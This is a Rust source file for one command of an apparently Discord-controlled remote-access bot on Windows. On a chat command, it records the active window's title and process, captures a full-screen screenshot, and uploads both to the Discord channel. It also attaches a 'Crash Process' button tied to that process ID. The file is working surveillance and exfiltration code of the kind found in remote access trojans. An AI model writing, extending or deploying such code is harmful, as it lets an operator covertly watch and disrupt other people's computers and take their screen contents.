use crate::commands::*;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;
use twilight_model::channel::message::component::{ActionRow, Button, ButtonStyle};
use twilight_model::channel::message::Component;
use twilight_model::http::attachment::Attachment;

use winapi::um::winuser::{GetForegroundWindow, GetWindowTextW, GetWindowThreadProcessId};
use winapi::shared::minwindef::DWORD;
use sysinfo::{System, SystemExt, Pid, PidExt, ProcessExt};

pub struct ForegroundCommand;

#[async_trait]
impl BotCommand for ForegroundCommand {
    fn name(&self) -> &str { "foreground" }
    fn description(&self) -> &str { "Get current foreground window info with screenshot and crash button" }
    fn category(&self) -> &str { "utility" }
    fn usage(&self) -> &str { ".foreground" }
    fn examples(&self) -> &'static [&'static str] {
        &[".foreground"]
    }
    fn aliases(&self) -> &'static [&'static str] { &["fg", "active"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        _args: Arguments,
    ) -> Result<()> {
        unsafe {
            let hwnd = GetForegroundWindow();
            if hwnd.is_null() {
                http.create_message(msg.channel_id)
                    .content("**Error**: No foreground window found")
                    .await?;
                return Ok(());
            }
            //  title
            let mut title: [u16; 512] = [0; 512];
            let len = GetWindowTextW(hwnd, title.as_mut_ptr(), title.len() as i32);
            let window_title = if len > 0 {
                String::from_utf16_lossy(&title[..len as usize])
            } else {
                "Unknown".to_string()
            };
            // process ID
            let mut process_id: DWORD = 0;
            GetWindowThreadProcessId(hwnd, &mut process_id);
            
            let process_name = crate::utils::syscall::get_process_list()
                .into_iter()
                .find(|(pid, _)| *pid == process_id)
                .map(|(_, name)| name)
                .unwrap_or_else(|| "Unknown".to_string());
            // screenshot
            let screenshot = screenshots::Screen::all().unwrap().first().unwrap().capture().unwrap();
            let png_data = screenshot.buffer().to_vec();
            // attachment
            let attachment = Attachment::from_bytes(
                "foreground.png".to_string(),
                png_data.clone(),
                1
            );
            // button
            let button = Button {
                custom_id: Some(format!("crash_{}", process_id)),
                disabled: false,
                emoji: None,
                label: Some("Crash Process".to_string()),
                style: ButtonStyle::Danger,
                url: None,
                sku_id: None,
            };
            let action_row = Component::ActionRow(ActionRow {
                components: vec![Component::Button(button)],
            });
            let info = format!(
                "**Foreground Window**\n\n\
                **Title**: {}\n\
                **Process**: {} (PID: {})\n\
                **Handle**: 0x{:X}",
                window_title, process_name, process_id, hwnd as usize
            );
            http.create_message(msg.channel_id)
                .content(&info)
                .attachments(&[attachment])
                .components(&[action_row])
                .await?;
        }

        Ok(())
    }
}
